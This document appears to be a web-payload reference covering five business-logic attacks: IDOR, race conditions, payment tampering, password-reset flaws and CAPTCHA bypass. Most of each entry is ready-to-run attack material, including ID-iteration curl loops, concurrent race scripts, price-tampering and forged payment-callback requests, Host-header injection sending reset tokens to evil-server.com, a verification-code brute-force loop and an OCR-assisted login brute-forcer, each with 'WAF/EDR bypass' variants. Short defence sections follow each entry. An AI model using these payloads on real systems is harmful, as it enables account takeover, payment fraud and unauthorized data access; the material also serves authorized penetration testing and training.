# Business Logic Vulnerabilities

_5 web payloads_

### IDOR Broken Access Control  `biz-idor`
_Insecure Direct Object Reference (IDOR): access another user's data without authorization by tampering with the object ID in a request parameter. An attacker can iterate over parameters such as user IDs and order numbers to obtain unauthorized resources._
Subcategory: **Broken Access Control** · tags: `IDOR` `Broken Access Control` `Business Logic` `OWASP` `A01`

**Prerequisites:**
- The target has an ID-based resource access interface
- A logged-in ordinary user account

**Attack Chain:**

**1. Identify iterable parameters**
> Identify endpoints in the API that use a number/UUID as a resource identifier
```
# Capture the ID parameter in the request
GET /api/users/1001/profile HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# Common IDOR parameters: user_id, order_id, file_id, invoice_id, account_id
```
**Syntax breakdown:**
- `/api/users/1001/profile` — RESTful resource path, 1001 is the tamperable user ID _path_
- `Authorization: Bearer` — carries the current user's JWT token _header_
- `{TARGET}` — target host _variable_
- `{TOKEN}` — authentication token _variable_

**2. Horizontal privilege escalation testing**
> Iterate over the user ID parameter and observe response code and size differences to confirm the broken access control
```
# Use user A's Token to access user B's data
for id in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -H "Authorization: Bearer {TOKEN}" \
    "https://{TARGET}/api/users/$id/profile"
  echo " -> user_id=$id"
done
```
**Syntax breakdown:**
- `seq 1000 1010` — generate a consecutive ID sequence for iteration _command_
- `%{http_code}` — curl outputs the HTTP status code _format_
- `%{size_download}` — outputs the response body size for comparison _format_
- `-s -o /dev/null` — silent mode, discard the response body _parameter_

**3. Vertical privilege escalation testing**
> Attempt to call an admin API or modify your own role as a low-privilege user
```
# Use an ordinary user Token to access an admin interface
GET /api/admin/users HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# Attempt to modify the role
PUT /api/users/1001 HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"role": "admin", "is_admin": true}
```
**Syntax breakdown:**
- `GET /api/admin/users` — admin-only interface _path_
- `PUT` — HTTP modification request method _method_
- `"role": "admin"` — attempt to change the user role to administrator _json_
- `"is_admin": true` — attempt to enable the administrator flag _json_

**4. Parameter pollution privilege escalation**
> Use parameter duplication, JSON key override, and array injection to bypass IDOR defenses
```
# Double parameter pollution
GET /api/orders?user_id=1001&user_id=1002 HTTP/1.1

# JSON parameter override
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 1001, "name": "test", "user_id": 1002}

# Array injection
GET /api/orders?user_id[]=1001&user_id[]=1002 HTTP/1.1
```
**Syntax breakdown:**
- `user_id=1001&user_id=1002` — HTTP Parameter Pollution (HPP), the same parameter appears twice _technique_
- `"user_id": 1002` — a duplicate JSON key overrides the previous value _json_
- `user_id[]` — array parameter injection _technique_

**WAF/EDR Bypass Variants:**

**Encoded ID bypass**
> Bypass ID validation via encoding, negative numbers, overflow, and so on
```
# Base64-encoded ID
/api/users/MTAwMQ== (base64 of 1001)
# Hex-encoded
/api/users/0x3E9
# Negative number/overflow
/api/users/-1
/api/users/2147483647
```
**Syntax breakdown:**
- `MTAwMQ==` — the Base64 encoding of 1001 _encoding_
- `0x3E9` — the hexadecimal representation of 1001 _encoding_
- `-1` — negative number boundary test _value_
- `2147483647` — INT32 maximum value overflow test _value_

**Overview:** IDOR (Insecure Direct Object References) is the core vulnerability type in A01:2021-Broken Access Control of the OWASP Top 10. When an application uses user-controllable input to directly access a database object (e.g. via user_id/order_id) without verifying whether the current user has permission, an attacker can iterate over parameter values to access another user's data without authorization, modify another user's information, or even escalate their own privileges.

**Vulnerability Principle:** The root cause of IDOR vulnerabilities is that the backend lacks fine-grained permission validation. Common scenarios: (1) the API directly uses the ID in the URL path or query parameter to query the database; (2) the backend only verifies whether the user is logged in but not resource ownership; (3) the use of predictable auto-increment IDs rather than UUIDs; (4) the frontend hides the entry point but the backend does not validate. The impact can range from leaking a single user's personal information to exporting the entire database in bulk.

**Exploitation Method:** Exploitation steps: (1) log in to two test accounts A and B with different privileges; (2) capture account A's API requests and record all interfaces containing ID parameters; (3) replace the ID in A's requests with B's ID and observe whether B's data can be accessed; (4) automatically iterate over consecutive IDs and tally the success rate; (5) test vertical privilege escalation: use an ordinary user Token to access an admin API. Recommended tools: the Burp Suite Intruder/Autorize plugin can automate detection.

**Defensive Measures:** Remediation: (1) the backend must verify on every request whether the current user has permission to access the requested resource (based on the user_id in the session rather than the request parameter); (2) use UUIDs instead of auto-increment IDs to prevent iteration; (3) implement an RBAC or ABAC access control model; (4) enforce rate limiting on sensitive operations to prevent bulk iteration; (5) use the Burp Autorize plugin for automated IDOR detection during the development phase.

---

### Race Condition Attack  `biz-race-condition`
_Exploit a server-side TOCTOU (Time-of-Check to Time-of-Use) vulnerability by triggering the same operation multiple times within the time window between check and execution using concurrent requests, achieving business logic breaks such as duplicate coupon claiming, duplicate withdrawals, and over-purchasing._
Subcategory: **Race Condition** · tags: `Race Condition` `Race Condition` `TOCTOU` `Concurrency` `Business Logic`

**Prerequisites:**
- The target has operations on quantifiable resources such as balance/points/coupons
- Python/Turbo Intruder environment

**Attack Chain:**

**1. Identify race targets**
> Identify API endpoints involving resource deduction and limited-quantity operations
```
# Typical race scenarios:
# 1. Coupon claiming POST /api/coupon/claim
# 2. Balance withdrawal POST /api/withdraw
# 3. Points redemption POST /api/points/exchange
# 4. Limited-stock flash purchase POST /api/order/create
# 5. Voting/liking POST /api/vote
```
**Syntax breakdown:**
- `POST /api/coupon/claim` — coupon claiming — a typical race target _path_
- `POST /api/withdraw` — withdrawal operation — balance race _path_
- `TOCTOU` — the race window from check time to use time _concept_

**2. Python concurrency test script**
> Use Python asyncio to concurrently send 50 identical requests and detect whether multiple claims are possible
```
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())
```
**Syntax breakdown:**
- `asyncio.gather` — wait in parallel for all coroutines to complete _function_
- `aiohttp.ClientSession` — asynchronous HTTP client _function_
- `for _ in range(50)` — create 50 concurrent requests _keyword_
- `{TARGET}` — target address _variable_

**3. Burp Turbo Intruder test**
> Burp Turbo Intruder's gate mechanism ensures all requests are sent simultaneously
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(50):
        engine.queue(target.req, gate="race1")
    engine.openGate("race1")

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)
```
**Syntax breakdown:**
- `concurrentConnections=30` — 30 concurrent connections _parameter_
- `pipeline=True` — enable HTTP pipelining to improve concurrency _parameter_
- `gate="race1"` — request gate — all requests are queued and released simultaneously _technique_
- `engine.openGate` — open the gate and send all queued requests simultaneously _function_

**4. Verify race success**
> Query the account resources to confirm whether the race condition was successfully exploited
```
# Check whether the resource was consumed multiple times
GET /api/user/coupons HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# Expected: limited to 1 coupon but actually received multiple
# Check the balance change
GET /api/user/balance HTTP/1.1
```
**Syntax breakdown:**
- `GET /api/user/coupons` — query the user's coupon list _path_
- `GET /api/user/balance` — query the user's balance _path_

**WAF/EDR Bypass Variants:**

**HTTP/2 single-connection concurrency**
> HTTP/2 multiplexing sends multiple concurrent requests over a single TCP connection, bypassing connection-count-based limits
```
# HTTP/2 multiplexing for concurrency over the same connection
curl --http2 --parallel --parallel-max 50 \
  -H "Authorization: Bearer {TOKEN}" \
  -X POST "https://{TARGET}/api/coupon/claim" \
  -d '{"coupon_id":"C001"}' \
  --next --http2 --parallel ...
```
**Syntax breakdown:**
- `--http2` — force the use of the HTTP/2 protocol _parameter_
- `--parallel --parallel-max 50` — parallel requests, maximum 50 _parameter_
- `multiplexing` — the HTTP/2 multiplexing feature _concept_

**Overview:** A Race Condition is a vulnerability that exploits the time window that exists on the server side between Check and Use. When multiple concurrent requests arrive simultaneously, the server may pass the check multiple times before deducting the resource, causing the resource to be consumed repeatedly. Such vulnerabilities are common in e-commerce, finance, social, and other scenarios involving operations on finite resources.

**Vulnerability Principle:** The root cause is that the server does not enforce atomicity on critical business operations. Typical TOCTOU flow: (1) the server checks whether the user has already claimed the coupon → passes; (2) before writing the "claimed" record, another request also passes the check; (3) both requests successfully execute the coupon claim. The lack of row locks/optimistic locks at the database level and the lack of distributed locks/idempotency keys at the application level are the main causes.

**Exploitation Method:** Exploitation method: (1) use Burp Turbo Intruder's gate mechanism or Python asyncio to send a large number of concurrent requests; (2) HTTP/2 multiplexing can achieve very high concurrency over a single connection; (3) observe whether the number of successes in the responses exceeds the expected limit; (4) focus on testing scenarios such as coupon claiming, balance withdrawal, points redemption, limited-stock flash purchases, and CAPTCHA verification. The Single Packet Attack is a highly efficient race exploitation technique introduced in 2023.

**Defensive Measures:** Defenses: (1) use SELECT FOR UPDATE row locks or optimistic locks (version number mechanism) at the database level; (2) use a Redis distributed lock (SETNX) at the application level to ensure atomicity; (3) generate an Idempotency Key for each operation so that duplicate requests return the same result; (4) use a message queue to serialize critical operations; (5) complete the check and execution within a transaction to avoid the TOCTOU window.

---

### Payment Logic Tampering  `biz-payment-tamper`
_Manipulate transaction logic by modifying parameters such as amount, quantity, and discount in payment requests. Common in e-commerce platforms and online payment systems, it can lead to serious business risks such as zero-cost purchases, negative prices, and stacked discounts._
Subcategory: **Payment Security** · tags: `Payment` `Amount Tampering` `Business Logic` `Zero-Cost Purchase` `E-commerce Security`

**Prerequisites:**
- The target has a payment/order feature
- Ability to intercept and modify HTTP requests

**Attack Chain:**

**1. Amount tampering test**
> Modify the price field in the order request to test whether the backend validates the amount
```
POST /api/order/create HTTP/1.1
Host: {TARGET}
Content-Type: application/json
Authorization: Bearer {TOKEN}

# Original request
{"product_id": "P001", "quantity": 1, "price": 9900}

# Tampered to 1 cent
{"product_id": "P001", "quantity": 1, "price": 1}

# Tampered to 0
{"product_id": "P001", "quantity": 1, "price": 0}

# Negative amount (refund credited)
{"product_id": "P001", "quantity": 1, "price": -100}
```
**Syntax breakdown:**
- `"price": 9900` — original amount 9900 cents (99 yuan) _json_
- `"price": 1` — tampered to 1 cent _json_
- `"price": -100` — a negative amount may cause the balance to increase _json_

**2. Quantity and shipping tampering**
> Test quantity boundary values, shipping fee tampering, and discount overflow
```
# Quantity of 0 or negative
{"product_id": "P001", "quantity": 0, "price": 9900}
{"product_id": "P001", "quantity": -1, "price": 9900}

# Modify the shipping fee
{"product_id": "P001", "quantity": 1, "shipping_fee": -500}

# Oversized discount
{"product_id": "P001", "quantity": 1, "discount": 9999}
```
**Syntax breakdown:**
- `"quantity": -1` — a negative quantity may cause a refund _json_
- `"shipping_fee": -500` — a negative shipping fee offsets the total price _json_
- `"discount": 9999` — an excessive discount makes the total price negative _json_

**3. Coupon stacking and substitution**
> Test whether coupons can be stacked or substituted with a high-value coupon
```
# Stack multiple coupons
{"product_id": "P001", "coupons": ["C001", "C002", "C003"]}

# Substitute a high-value coupon ID
{"product_id": "P001", "coupon_id": "INTERNAL_VIP_100OFF"}

# Modify the discount amount field
{"product_id": "P001", "coupon_discount": 9900}
```
**Syntax breakdown:**
- `"coupons": [...]` — pass multiple coupons in an array to attempt stacking _json_
- `"coupon_discount": 9900` — directly tamper with the discount amount _json_

**4. Payment callback tampering**
> Forge the payment platform's callback notification, tampering with the payment status and amount
```
# Simulate a payment success callback
POST /api/payment/callback HTTP/1.1
Host: {TARGET}
Content-Type: application/x-www-form-urlencoded

order_id=ORD20240001&status=SUCCESS&amount=1&sign=tampered_sign

# Modify the amount in the callback
order_id=ORD20240001&status=SUCCESS&amount=1&trade_no=FAKE123456
```
**Syntax breakdown:**
- `status=SUCCESS` — forge the payment success status _value_
- `amount=1` — actually paid 1 cent but the order amount is 99 yuan _value_
- `sign=tampered_sign` — attempt to forge the signature (if signature validation is missing) _value_

**WAF/EDR Bypass Variants:**

**Scientific notation bypass**
> Use scientific notation, floating-point precision, and type confusion to bypass amount validation
```
# Scientific notation
{"price": 1e-10}
# Floating-point precision
{"price": 0.000000001}
# String type confusion
{"price": "0.01"}
# Unicode digit
{"price": "\uff10"}
```
**Syntax breakdown:**
- `1e-10` — scientific notation representing an extremely small amount _encoding_
- `0.000000001` — floating-point precision underflow _value_
- `"0.01"` — a string type may bypass numeric validation _technique_

**Overview:** Payment logic vulnerabilities are among the most serious business logic flaws in e-commerce and financial systems. By intercepting and modifying the payment request parameters sent by the client (such as price, quantity, shipping fee, discount), or by forging a third-party payment platform's callback notification, an attacker can achieve zero-cost purchases, profit from negative prices, bypass payment, and similar attacks. The financial loss from such vulnerabilities is usually direct.

**Vulnerability Principle:** Root causes include: (1) the frontend calculates the price and the backend does not re-validate it — trusting the amount submitted by the client; (2) no range validation on quantity and amount (negative, zero, oversized values); (3) the payment callback does not verify the signature or the signature verification logic is flawed; (4) the coupon system does not restrict stacking; (5) missing consistency validation between the order amount and the actual paid amount. Many developers mistakenly believe HTTPS encryption can prevent tampering.

**Exploitation Method:** Exploitation method: (1) use Burp Suite to intercept the order request and modify fields such as price/quantity/discount; (2) test boundary values: 0, negative, extremely large, floating-point, scientific notation; (3) check whether the payment callback interface can be accessed and forged directly; (4) test coupon ID substitution and stacking; (5) check whether the order state machine can skip the payment step and jump directly to "paid". Focus on mobile APIs, which often have weaker validation.

**Defensive Measures:** Defenses: (1) the server must re-query the price by product ID and calculate the total, never trusting the client's amount; (2) perform strict range validation on all numeric parameters (>0 and <MAX); (3) the payment callback must verify the signature and confirm the amount matches the order; (4) use a database transaction to ensure atomic deduction of coupons; (5) implement a strict order state machine to prevent state jumps.

---

### Password Reset Logic Flaws  `biz-password-reset`
_Logic vulnerabilities in the password reset flow, including reset token leakage, verification code brute force, response manipulation, Host header injection, and other attack techniques that can achieve arbitrary user password reset._
Subcategory: **Authentication Flaws** · tags: `Password Reset` `Authentication Bypass` `Business Logic` `Verification Code` `Host Injection`

**Prerequisites:**
- The target has a password reset/recovery feature
- Ability to intercept HTTP requests

**Attack Chain:**

**1. Host header injection to steal the reset link**
> Modify the Host header so that the link in the reset email points to the attacker's server, stealing the reset token
```
POST /api/password/reset HTTP/1.1
Host: evil-server.com
X-Forwarded-Host: evil-server.com
Content-Type: application/json

{"email": "victim@target.com"}

# The reset link the victim receives becomes:
# https://evil-server.com/reset?token=abc123
```
**Syntax breakdown:**
- `Host: evil-server.com` — tamper with the Host header so the reset link points to the attacker _header_
- `X-Forwarded-Host` — alternative injection header, the reverse proxy may trust this header _header_
- `victim@target.com` — the target user's email _value_

**2. Verification code brute force**
> Brute-force the 4-6 digit verification code and test whether there is a rate limit
```
# 4-digit verification code brute force
for code in $(seq -w 0000 9999); do
  response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
  if echo "$response" | grep -q "success"; then
    echo "[+] Code found: $code"
    break
  fi
done
```
**Syntax breakdown:**
- `seq -w 0000 9999` — generate all 4-digit numbers from 0000-9999 _command_
- `grep -q "success"` — match the success response _command_
- `{TARGET}` — target address _variable_

**3. Response manipulation bypass**
> Intercept and modify the server response; the frontend may rely solely on the response status
```
# Original failure response
{"code": 400, "message": "Verification code error"}

# Intercept and modify to success
{"code": 200, "message": "Verification successful", "token": "reset_token_here"}

# Some frontends only check the code field before allowing subsequent operations
```
**Syntax breakdown:**
- `"code": 200` — change the error code to a success code _json_
- `Response manipulation` — modify the HTTP response to deceive the frontend _concept_

**4. Reset token weak randomness**
> Analyze the reset token generation algorithm and check whether it is based on predictable factors
```
# Collect multiple reset tokens to analyze the pattern
token1: 1707811200_user1  (timestamp+username)
token2: 1707811260_user2

# Predictable token generation
import hashlib
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()

# Construct the reset token using known information
predicted = hashlib.md5(b"1707811200_victim@target.com").hexdigest()
```
**Syntax breakdown:**
- `hashlib.md5` — MD5 hash — commonly used for weak-randomness tokens _function_
- `timestamp_email` — timestamp+email — predictable token factors _concept_

**WAF/EDR Bypass Variants:**

**Multi-Host header bypass**
> Use multiple HTTP header injection methods to attempt to override the domain in the reset link
```
# Double Host header
Host: target.com
Host: evil.com

# Absolute URL override
POST https://evil.com/api/password/reset HTTP/1.1
Host: target.com

# X-Forwarded series
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com/reset
```
**Syntax breakdown:**
- `Double Host header` — some servers take the second Host value _technique_
- `X-Forwarded-Host` — a forwarding header trusted by the reverse proxy _header_

**Overview:** Password reset is one of the most critical authentication flows in web applications. An attacker can exploit logic flaws in the reset flow via multiple techniques: Host header injection to steal the reset token, brute-forcing a short verification code, manipulating the HTTP response to deceive the frontend, exploiting weak randomness to predict the reset token, and so on. Successful exploitation can achieve arbitrary user Account Takeover.

**Vulnerability Principle:** Common flaws: (1) the reset email/SMS uses the Host header to concatenate the link URL rather than hardcoding the domain; (2) the verification code has no expiration time and attempt limit (a 4-digit code only has 10,000 possibilities); (3) the frontend uses the code field in the response to determine the verification result rather than recording state in a backend session; (4) the reset token is generated with a predictable algorithm such as MD5(timestamp+email); (5) the token has no expiration time or single-use restriction.

**Exploitation Method:** Attack path: (1) Host injection: use Burp to modify Host/X-Forwarded-Host to the attacker's domain, trigger the reset flow, and receive the request with the token on the attacker's server; (2) verification code brute force: use Burp Intruder with Pitchfork mode to iterate over 0000-9999; (3) response manipulation: use Burp to intercept the failure response and modify it to success to deceive the frontend; (4) token analysis: collect multiple tokens, analyze the pattern, and construct the target user's token. Multiple techniques can be combined.

**Defensive Measures:** Defenses: (1) hardcode the application domain in the reset link, do not obtain it from HTTP headers; (2) set the verification code to 6 digits or more, 5-minute expiration, and lockout after 5 errors; (3) record critical state changes (such as verification passed) only in a server-side session, not relying on the frontend; (4) use a CSPRNG such as crypto.randomBytes(32) to generate the token; (5) invalidate the token immediately after single use and set a 15-minute expiration.

---

### CAPTCHA Bypass Techniques  `biz-captcha-bypass`
_Various techniques for bypassing human verification mechanisms such as graphic CAPTCHAs, SMS verification codes, and slider verification, including response leakage, reuse attacks, OCR recognition, and logic flaw exploitation._
Subcategory: **CAPTCHA Security** · tags: `CAPTCHA` `CAPTCHA` `Bypass` `SMS Verification Code` `Human Verification`

**Prerequisites:**
- The target has a CAPTCHA-protected feature
- Python environment

**Attack Chain:**

**1. CAPTCHA response leakage**
> Check whether the response body, header, or cookie leaks the CAPTCHA plaintext or encoded value
```
# Check whether the response contains the CAPTCHA
POST /api/send-sms HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{"phone": "13800138000"}

# The response may leak
{"code": 200, "captcha": "8462", "message": "Sent successfully"}
# Or in the response header
X-Captcha-Code: 8462
Set-Cookie: captcha=ODQ2Mg==  (base64 of 8462)
```
**Syntax breakdown:**
- `"captcha": "8462"` — the response body directly leaks the CAPTCHA _json_
- `X-Captcha-Code` — a custom response header leaks the CAPTCHA _header_
- `ODQ2Mg==` — the Base64 encoding of 8462 in the cookie _encoding_

**2. CAPTCHA reuse attack**
> The CAPTCHA is not invalidated after use, and the same CAPTCHA can be used repeatedly
```
# Step 1: normally obtain and enter the correct CAPTCHA
POST /api/login
{"username": "test", "password": "test123", "captcha": "8462", "captcha_id": "abc"}

# Step 2: repeatedly attempt using the same captcha_id and CAPTCHA
POST /api/login
{"username": "admin", "password": "admin123", "captcha": "8462", "captcha_id": "abc"}

# If the CAPTCHA is not invalidated after use, it can be reused indefinitely
```
**Syntax breakdown:**
- `"captcha_id": "abc"` — CAPTCHA session ID _json_
- `Reuse attack` — the same CAPTCHA + ID combination is used repeatedly _concept_

**3. Delete the CAPTCHA parameter**
> Test whether the backend still validates when the CAPTCHA parameter is not passed, passed empty, or passed null
```
# Original request (contains the CAPTCHA)
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass", "captcha": "1234"}

# Delete the CAPTCHA field
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass"}

# Empty value test
{"username": "admin", "password": "pass", "captcha": ""}
{"username": "admin", "password": "pass", "captcha": null}
```
**Syntax breakdown:**
- `Delete the captcha field` — the server may skip validation for an unpassed parameter _technique_
- `"captcha": null` — a null value may bypass non-empty validation _value_

**4. Master CAPTCHA**
> Test for master CAPTCHAs or debug backdoors left by developers
```
# Common master/debug CAPTCHAs
0000
1111
1234
8888
9999
6666
000000
123456

# Test interface debug backdoors
{"phone": "13800138000", "code": "000000", "debug": true}
{"phone": "13800138000", "code": "master_code"}
```
**Syntax breakdown:**
- `0000/1234/8888` — common development/debug master codes _value_
- `"debug": true` — a debug mode parameter may bypass verification _json_

**WAF/EDR Bypass Variants:**

**OCR automatic recognition of graphic CAPTCHAs**
> Use the ddddocr library to automatically recognize graphic CAPTCHAs and integrate it into the brute-force flow
```
import ddddocr
import requests

ocr = ddddocr.DdddOcr()

def solve_captcha(target):
    # Get the CAPTCHA image
    resp = requests.get(f"https://{target}/captcha/image")
    code = ocr.classification(resp.content)
    return code

# Integrate into the brute-force script
for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(f"https://{TARGET}/api/login",
        json={"user":"admin","pass":pwd,"captcha":captcha})
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
```
**Syntax breakdown:**
- `ddddocr.DdddOcr` — a Chinese-developed deep learning OCR library with a high recognition rate _function_
- `ocr.classification` — classify the image to recognize the CAPTCHA text _function_

**Overview:** CAPTCHA is a core mechanism for defending against automated attacks, but numerous logic flaws exist in actual deployments that can be bypassed. Common attack techniques include: leaking the CAPTCHA plaintext in the response, the CAPTCHA not being invalidated after use so it can be reused, deleting the parameter to bypass validation, master/debug codes, OCR automatic recognition, and so on. After bypassing the CAPTCHA, further attacks such as brute force, bulk registration, and automated volume manipulation can be carried out.

**Vulnerability Principle:** Analysis of common flaws: (1) the CAPTCHA is leaked to the client via channels such as the API response, cookie, or JS variable; (2) the CAPTCHA is not immediately deleted on the server after verification, so the same code can be used multiple times; (3) the backend treats CAPTCHA validation as optional and skips it when the parameter is not passed; (4) master codes left over from the development environment (such as 000000) are not cleaned up before going live; (5) the graphic CAPTCHA is not complex enough and is easily recognized by OCR; (6) the SMS verification code has too long an expiration (>5 minutes) or an unlimited number of attempts.

**Exploitation Method:** Implementation steps: (1) after sending the CAPTCHA request, check the complete response (including headers and cookies); (2) after obtaining a correct CAPTCHA once, attempt to submit it repeatedly; (3) delete the captcha field in the request or set it empty for testing; (4) try common master codes 0000/1234/8888; (5) for a graphic CAPTCHA, use ddddocr or the TrueCaptcha API for automatic recognition; (6) combine the above methods and integrate them into Burp Intruder or a Python script to achieve automated bypass + brute force.

**Defensive Measures:** Defensive recommendations: (1) the CAPTCHA is only generated and validated on the server side, and never returned to the client via any channel; (2) invalidate the CAPTCHA immediately after single use; (3) require the CAPTCHA parameter to be present and non-empty; (4) remove all debug backdoors and master codes; (5) use a high-complexity CAPTCHA (such as reCAPTCHA v3/hCaptcha) or behavioral verification (slider, click-to-select); (6) set the SMS verification code to 6 digits, 3-minute expiration, and 30-minute lockout after 5 errors.

---
